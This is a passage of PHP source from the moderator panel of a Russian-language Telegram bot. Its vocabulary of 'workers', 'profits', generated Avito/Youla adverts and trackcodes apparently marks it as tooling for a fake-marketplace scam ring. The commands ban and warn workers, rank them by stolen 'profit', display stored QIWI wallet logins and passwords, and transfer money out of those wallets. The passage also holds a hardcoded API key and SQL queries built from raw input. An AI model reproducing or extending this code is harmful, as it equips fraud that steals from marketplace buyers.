                    if (preg_match('/^\/warn \d+$/i', $message['text']) == TRUE) {
                        $user_id = mb_substr($message['text'], 6);

                        if ($user_id == '808326111' OR $user_id == '1204750285') {
                            $text = "⚠️ <b>Ты ахуел,ты каво варнеш?</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        } else {
                            $query = mysqli_query($connection, "SELECT `access`, `warns` FROM `accounts` WHERE `telegram` = '$user_id'");

                            if (mysqli_num_rows($query) > 0) {
                                $user = mysqli_fetch_assoc($query);

                                if ($user['access'] <= 0) {
                                    $text = "🚫 <a href=\"tg://user?id=$user_id\">Воркер</a> <b>уже заблокирован или неактивен</b>";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				
                                } elseif ($user['warns'] < 3 AND $user['warns'] != 2) {
                                    mysqli_query($connection, "UPDATE `accounts` SET `warns` = `warns`+1 WHERE `telegram` = '$user_id'");
                                    $text = "⚠️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>выдал предупреждение</b> <a href=\"tg://user?id=$user_id\">воркеру</a> <code>[" . ($user['warns'] + 1) . "/3]</code>";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				
                                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                    $text = "⚠️ <b>Модератор выдал вам предупреждение</b> <code>[" . ($user['warns'] + 1) . "/3]</code>";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                } elseif ($user['warns'] >= 2) {
                                    mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1', `warns` = `warns`+1, `card` = '0' WHERE `telegram` = '$user_id'");
                                    mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");
                                    mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");

                                    send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time() + 24 * 500 * 3600));
                                    send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time() + 24 * 500 * 3600));
                                    $text = "⚠️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>выдал предупреждение</b> <a href=\"tg://user?id=$user_id\">воркеру</a> <code>[" . ($user['warns'] + 1) . "/3]</code>\n\n";
                                    $text .= "Воркер был заблокирован";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				
                                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                    $text = "⚠️ <b>Модератор выдал вам предупреждение</b> <code>[" . ($user['warns'] + 1) . "/3]</code>\n\n";
                                    $text .= "Для вас доступ был заблокирован";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                }
                            } else {
                                $text = "🚫 <b>Воркер с таким ID не найден</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            }
                        }
                    } else {
                        $text = "❔ Используйте /warn <code>[Telegram ID]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/^\/ban/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/ban \d+$/i', $message['text']) == TRUE) {
                        $user_id = mb_substr($message['text'], 5);

                        if ($user_id == '808326111' OR $user_id == '1204750285') {
                            $text = "😡 <b>Ты ахуел,ты каво банеш?</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        } else {
                            $query = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$user_id'");

                            if (mysqli_num_rows($query) > 0) {
                                mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1', `card` = '0' WHERE `telegram` = '$user_id'");
                                mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
                                mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");

                                send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time() + 24 * 500 * 3600));
                                send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time() + 24 * 500 * 3600));

                                $text = "🚫 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>заблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                                $text = "🚫 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>заблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                $text = "🚫 <b>Модератор заблокировал вам доступ к проекту.</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                mysqli_query($connection, "INSERT INTO `accounts` (`username`, `telegram`, `access`, `stake`, `card`, `created`) VALUES ('username', '$user_id', '-1', '0', '0', '" . time() . "')");
                                send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time() + 24 * 500 * 3600));
                                send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time() + 24 * 500 * 3600));
                                $text = "🚫 <b>Воркер с таким ID не найден, но был заблокирован</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                                $text = "🚫 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>заблокировал</b> <a href=\"tg://user?id=$user_id\">пользователя</a> <b>с Telegram ID:</b> <code>$user_id</code>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            }
                        }
                    } else {
                        $text = "❔ Используйте /ban <code>Telegram ID воркера</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/^\/unban/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/unban \d+$/i', $message['text']) == TRUE) {
                        $user_id = mb_substr($message['text'], 7);

                        $query = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$user_id'");

                        if (mysqli_num_rows($query) > 0) {
                            $user = mysqli_fetch_assoc($query);

                            if ($user['access'] <= 0) {
                                mysqli_query($connection, "UPDATE `accounts` SET `access` = '0', `warns` = '0' WHERE `telegram` = '$user_id'");

                                send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
                                send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));

                                $text = "♻️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>разблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                                $text = "♻️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>разблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                $text = "♻️ <b>Модератор разблокировал вам доступ к проекту.</b>\n\n";
                                $text .= "Можете подать свою заявку в команду, /start";
                                send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
                                send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));

                                $text = "♻️ <b>Воркер не заблокирован, но был вынесен из черного списка в беседах</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            }
                        } else {
                            $text = "♻️ <b>Воркер с таким ID не найден</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /unban <code>Telegram ID воркера</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/card (\d{16}|\d{4}\s\d{4}\s\d{4}\s\d{4}|0)/i', $message['text']) == TRUE) {
                    $card = str_replace(' ', '', substr($message['text'], 6));

                    $query = mysqli_query($connection, "SELECT `login`, `password`, `token`, `amount`, `totalAmount`, `number`, `status`, `ip` FROM `cards` WHERE `number` = '$card'");

                    if (mysqli_num_rows($query) > 0) {
                        $card = mysqli_fetch_assoc($query);

                        require_once $_SERVER['DOCUMENT_ROOT'] . '/qiwi/api.php';
                        $qiwi = new Qiwi($card['login'], $card['token']);

                        $amount = floor($qiwi->getBalance()['accounts'][0]['balance']['amount']);

                        if ($card['amount'] < $amount) {
                            $totalAmount = ($amount - $card['amount']);
                            $card['totalAmount'] = $totalAmount;
                        } else {
                            $totalAmount = 0;
                        }

                        if ($card['status'] == '0') $status = 'Неактивна';
                        if ($card['status'] == '1') $status = 'Активна';

                        $workers = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0' AND `card` = '$card[number]'"));

                        $text = "💳 <b>Информация о карте:</b>\n\n";
                        $text .= "Номер карты: <code>$card[number]</code>\n";
                        $text .= "Данные для входа: <code>$card[login]:$card[password]</code>\n";
                        $text .= "Баланс: <code>$amount руб.</code> | Принято: <code>$card[totalAmount] руб.</code>\n";
                        $text .= "Статус: <code>$status</code>\n";
                        $text .= "Используют: <code>" . Endings($workers, "воркер", "воркера", "воркеров") . "</code>\n";
                        $text .= "Последний IP: <code>$card[ip]</code>\n";

                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    } else {
                        $bin = substr($message['text'], 6, -10);
                        $card = json_decode(curl_get_contents("https://api.cardinfo.online?input=$bin&apiKey=9f46488683ee53ae5b45215f7f566ffa"));

                        if (isset($card->{'bankNameLocal'}) OR isset($card->{'country'}) OR isset($card->{'cardType'})) {
                            $bankName = $card->{'bankNameLocal'};
                            $country = $card->{'country'};
                            $cardType = $card->{'brandName'};

                            $text = "💳 <b>Информация о карте</b> <code>" . substr($message['text'], 6) . "</code><b></b>\n\n";
                            if (isset($card->bankNameLocal)) $text .= "<b>Банк:</b> <code>$bankName</code>\n";
                            if (isset($card->country)) $text .= "<b>Страна:</b> <code>$country</code>\n";
                            if (isset($card->cardType)) $text .= "<b>Тип:</b> <code>$cardType</code>\n";

                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        } elseif ($bin == '489049' OR $bin == '469395') {
                            $text = "💳 <b>Информация о карте</b> <code>" . substr($message['text'], 6) . "</code><b></b>\n\n";
                            $text .= "<b>Банк:</b> <code>QIWI BANK</code>\n";
                            $text .= "<b>Страна:</b> <code>RU</code>\n";
                            $text .= "<b>Тип:</b> <code>Visa</code>\n";

                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        } elseif ($bin == '559900') {
                            $text = "💳 <b>Информация о карте</b> <code>" . substr($message['text'], 6) . "</code><b></b>\n\n";
                            $text .= "<b>Банк:</b> <code>YANDEX.MONEY</code>\n";
                            $text .= "<b>Страна:</b> <code>RU</code>\n";
                            $text .= "<b>Тип:</b> <code>Mastercard</code>\n";
                        } else {
                            $text = "🥺 <b>Информация о карте не найдена</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    }
                }

                if (preg_match('/\/settings/i', $message['text']) == TRUE) {
                    if ($settings['card'] == 0) $settings['card'] = 'Не установлена';

                    $stake = explode(':', $settings['stake']);

                    $avito = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(*) AS `count` FROM `free` WHERE `type` = '0'"));
                    $youla = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(*) AS `count` FROM `free` WHERE `type` = '1'"));

                    $text = "🔧 <b>Настройки</b>\n\n";
                    $text .= "<b>Карта по умолчанию:</b> <code>$settings[card]</code>\n";
                    $text .= "<b>Текущая ставка:</b> <code>оплата - $stake[0]% и возврат - $stake[1]%</code>\n";
                    $text .= "<b>Минимальная сумма товара:</b> <code>$settings[min_price] руб.</code>\n";
                    $text .= "<b>Максимальная сумма товара:</b> <code>$settings[max_price] руб.</code>\n";
                    $text .= "<b>Сумма доставки:</b> <code>$settings[delivery] руб.</code>\n\n";
                    $text .= "🎁 <b>Бесплатные аккаунты</b>\n";
                    $text .= "<b>Авито:</b> <code>$avito[count] шт.</code> | <b>Юла:</b> <code>$youla[count] шт.</code>";

                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                }

                if (preg_match('/\/stats/i', $message['text']) == TRUE) {
                    $total['workers'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0'"));
                    $total['users'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` = '0'"));
                    $total['banned'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` < '0'"));
                    $total['withCard'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0' AND `card` != '0'"));
                    $total['withOutCard'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0' AND `card` = '0'"));
                    $total['today'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `access` > '0' AND DATE_FORMAT(FROM_UNIXTIME(`created`), '%d.%m.%Y') = '" . date("d.m.Y") . "'"));

                    $payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `status` = '1'"));
                    $mpayments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `status` = '1' AND DATE_FORMAT(FROM_UNIXTIME(`time`), '%m.%Y') = '" . date("m.Y") . "'"));
                    $tpayemnts = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `today` FROM `payments` WHERE `status` = '1' AND DATE_FORMAT(FROM_UNIXTIME(`time`), '%d.%m.%Y') = '" . date("d.m.Y") . "'"));
                    if (empty($tpayemnts['today'])) $tpayemnts['today'] = '0';

                    $total['adverts'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `adverts`"));
                    $total['activeAdverts'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `status` = '1'"));
                    $total['deletedAdverts'] = mysqli_num_rows(mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `status` = '-1'"));

                    $text = "🐔 <b>Статистика проекта</b>\n\n";
                    $text .= "<b>Активных:</b> <code>" . Endings($total['workers'], "воркер", "воркера", "воркеров") . "</code>\n";
                    $text .= "<b>Неактивированных:</b> <code>" . Endings($total['users'], "воркер", "воркера", "воркеров") . "</code>\n";
                    $text .= "<b>Заблокировано:</b> <code>" . Endings($total['banned'], "воркер", "воркера", "воркеров") . "</code>\n";
                    $text .= "<b>С привязанной картой:</b> <code>" . Endings($total['withCard'], "воркер", "воркера", "воркеров") . "</code>\n";
                    $text .= "<b>Без карты:</b> <code>" . Endings($total['withOutCard'], "воркер", "воркера", "воркеров") . "</code>\n";
                    $text .= "<b>Сегодня одобрено:</b> <code>" . Endings($total['today'], "воркер", "воркера", "воркеров") . "</code>\n\n";
                    $text .= "<b>Успешных оплат:</b> <code>$payments[count]</code>\n";
                    $text .= "<b>Общий профит:</b> <code>$payments[total] руб.</code>\n\n";
                    $text .= "<b>Оплат за месяц:</b> <code>$mpayments[count]</code>\n";
                    $text .= "<b>Профит за месяц:</b> <code>$mpayments[total] руб.</code>\n\n";
                    $text .= "<b>Оплат сегодня:</b> <code>$tpayemnts[count]</code>\n";
                    $text .= "<b>Профит сегодня:</b> <code>$tpayemnts[today] руб.</code>\n\n";
                    $text .= "<b>Сгенерировано:</b> <code>" . Endings($total['adverts'], "объявление", "объявления", "объявлений") . "</code>\n";
                    $text .= "<b>Активных:</b> <code>" . Endings($total['activeAdverts'], "объявление", "объявления", "объявлений") . "</code>\n";
                    $text .= "<b>Неактивных:</b> <code>" . Endings($total['deletedAdverts'], "объявление", "объявления", "объявлений") . "</code>\n";

                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                }


                if (preg_match('/\/top/i', $message['text']) == TRUE) {
                    $payments = mysqli_query($connection, "SELECT `worker`, SUM(`amount`) AS `amount`, COUNT(`id`) AS `count` FROM `payments` WHERE `worker` != '0' AND `status` = '1' GROUP BY `worker` ORDER BY SUM(`amount`) DESC LIMIT 25");

                    $x = 0;
                    $text = "🔝 <b>Топ 25 воркеров:</b>\n\n";
                    while ($row = mysqli_fetch_assoc($payments)) {
                        $x = $x + 1;
                        $user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `username`, `hidden` FROM `accounts` WHERE `telegram` = '$row[worker]'"));
                        if ($user['username'] == '' OR $user['username'] == 'username') $user['username'] = 'Без никнейма';
                        if ($user['hidden'] == TRUE) $user['username'] == 'Скрыт';
                        $text .= "<b>$x. —</b> <a href=\"tg://user?id=$row[worker]\">$user[username]</a> — <code>$row[amount] RUB</code> — <code>" . Endings($row['count'], "профит", "профита", "профитов") . "</code>\n";
                    }

                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                }

                if (preg_match('/^\/defaultcard/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/defaultcard (\d{16}|\d{4}\s\d{4}\s\d{4}\s\d{4})$/i', $message['text']) == TRUE) {
                        $card = mb_substr($message['text'], 13);

                        mysqli_query($connection, "UPDATE `config` SET `card` = '$card'");

                        $text = "🃏 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил карту по умолчанию на</b> <code>" . str_replace(' ', '', $card) . "</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                        $text = "🃏 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил карту по умолчанию на</b> <code>" . str_replace(' ', '', $card) . "</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }

                if (preg_match('/^\/cards$/i', $message['text']) == TRUE) {
                    $query = mysqli_query($connection, "SELECT `amount`, `totalAmount`, `status`, `verify`, `number` FROM `cards` WHERE `status` = '1' ORDER BY `totalAmount` DESC");

                    if (mysqli_num_rows($query) > 0) {
                        $i = 0;
                        $text = "💳 <b>Информация о загруженных картах</b>\n\n";
                        $pages = ceil(mysqli_num_rows($query) / 10);

                        while ($row = mysqli_fetch_assoc($query)) {
                            $i = $i + 1;
                            $users = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `card` = '$row[number]' AND `access` > '0'");
                            if ($row['verify'] == 1) $status = '✅';
                            if ($row['verify'] == 0) $status = '❌';
                            if ($settings['card'] == $row['number']) $row['number'] = "💎 $row[number]";
                            $text .= $i . ". — <code>$row[number]</code> | Статус: $status | Баланс: <code>$row[amount] руб.</code>\nПринято: <code>$row[totalAmount] руб.</code> | Используют: <code>" . Endings(mysqli_num_rows($users), "воркер", "воркера", "воркеров") . "</code>\n";
                            #$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '⬅️ Назад', 'callback_data' => '/cards/'.$pages.'/'), Array('text' => 'Далее ➡️', 'callback_data' => '/cards/2/')))));
                        }
                    } else {
                        $text = "💳 <b>Ни одна карта не загружена</b>";
                    }

                    if (empty($keyboard)) $keyboard = '';
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                }

                if (preg_match('/^\/qiwipay/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/qiwipay [0-9]{11};([0-9]{11}|[0-9]{16});\d+(;.+|)$/i', $message['text']) == TRUE) {
                        if ($message['from'] == '826486511') {
                            $money = explode(';', mb_substr($message['text'], 9));

                            $query = mysqli_query($connection, "SELECT * FROM `cards` WHERE `login` = '$money[0]'");

                            if (mysqli_num_rows($query) > 0) {
                                $wallet = mysqli_fetch_assoc($query);

                                require_once $_SERVER['DOCUMENT_ROOT'] . '/qiwi/api.php';

                                $qiwi = new Qiwi($wallet['login'], $wallet['token']);
                                $amount = floor($qiwi->getBalance()['accounts'][0]['balance']['amount']);

                                if ($money[2] >= 1 AND $amount > ($money[2] + $money[2] * 0.02) AND ($money[2] + $money[2] * 0.02) < 60000) {
                                    if (preg_match('/^[0-9]{11}$/i', $money[1])) {
                                        $sendMoney = $qiwi->sendMoneyToQiwi([
                                            'id' => time() * 1005 + 5 . 99,
                                            'sum' => [
                                                'amount' => $money[2],
                                                'currency' => '643'
                                            ],
                                            'paymentMethod' => [
                                                'type' => 'Account',
                                                'accountId' => '643'
                                            ],
                                            'comment' => $money[3],
                                            'fields' => [
                                                'account' => '+' . $money[1]
                                            ]
                                        ]);

                                        $money[1] = '+' . $money[1];
                                    } elseif (preg_match('/^[0-9]{16}$/i', $money[1])) {
                                        if (mb_substr($money[1], 0, 1) == 2) $providerId = 31652;
                                        if (mb_substr($money[1], 0, 1) == 4) $providerId = 1963;
                                        if (mb_substr($money[1], 0, 1) == 5) $providerId = 21013;
                                        if (mb_substr($money[1], 0, 6) == 489049) $providerId = 22351;

                                        $sendMoney = $qiwi->sendMoneyToCard($providerId, [
                                            'id' => time() * 1005 + 5 . 99,
                                            'sum' => [
                                                'amount' => $money[2],
                                                'currency' => '643'
                                            ],
                                            'paymentMethod' => [
                                                'type' => 'Account',
                                                'accountId' => '643'
                                            ],
                                            'fields' => [
                                                'account' => $money[1]
                                            ]
                                        ]);
                                    }

                                    if ($sendMoney['transaction']['state']['code'] == 'Accepted') {
                                        $text = "🏧 <b>Вы успешно перевели с</b> <code>+$money[0]</code> <b>на</b> <code>$money[1]</code> <b>$money[2] руб.</b>\n\n";
                                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					
                                        $text = "🏧 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>перевел деньги с QIWI кошелька</b>\n\n";
                                        $text .= "<b>Кошелёк:</b> <code>$money[0]</code>\n";
                                        $text .= "<b>Получатель:</b> <code>$money[1]</code>\n";
                                        $text .= "<b>Сумма:</b> <code>$money[2] руб.</code>\n";
                                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                    } elseif (isset($sendMoney['message'])) {
                                        $text = "🏧 <b>Ошибка при переводе с</b> <code>+$money[0]</code> <b>на</b> <code>$money[1]</code> <b>$money[2] руб.</b>\n\n";
                                        $text .= "<b>Ошибка:</b> <i>$sendMoney[message]</i>";
                                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					
                                    } else {
                                        $text = "🏧 <b>Ошибка при переводе с</b> <code>+$money[0]</code> <b>на</b> <code>$money[1]</code> <b>$money[2] руб.</b>\n\n";
                                        $text .= "<b>Ошибка:</b> <i>Неизвестная ошибка</i>";
                                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					
                                    }
                                } else {
                                    $text = "⛔️ <b>На QIWI кошельке недостаточно средств</b>";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				
                                }
                            } else {
                                $text = "⛔️ <b>QIWI кошелек с таким номером не найден или неактивен</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            }
                        } else {
                            $text = "📛 <b>У вас нет доступа к этой команде</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /qiwipay <code>[Номер QIWI];[Получатель];[Сумма];[Комментарий]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/^\/setmoder/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/setmoder (\d+|[a-zA-Z0-9@._]+)$/i', $message['text']) == TRUE) {
                        if ($message['from'] == '808326111') {
                            if (preg_match('/^\/setmoder [a-zA-Z0-9@._]+$/i', $message['text']) == TRUE) {
                                $search = str_replace('@', '', mb_substr($message['text'], 11));
                                $query = mysqli_query($connection, "SELECT `username`, `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'");
                            } elseif (preg_match('/^\/setmoder \d+$/i', $message['text']) == TRUE) {
                                $search = mb_substr($message['text'], 11);
                                $query = mysqli_query($connection, "SELECT `username`, `telegram` FROM `accounts` WHERE `telegram` = '$search'");
                            }

                            if (mysqli_num_rows($query) > 0) {
                                $user = mysqli_fetch_assoc($query);
                                mysqli_query($connection, "UPDATE `accounts` SET `access` = '666' WHERE `telegram` = '$user[telegram]'");

                                $text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>названичил</b> <a href=\"tg://user?id=$user[telegram]\">воркера</a> <b>на пост модератора</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                $text = "🔑 <b>Воркер с таким ID не найден</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            }
                        } else {
                            $text = "📛 <b>У вас нет доступа к этой команде</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /setmoder <code>[Telegram ID] или [username]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
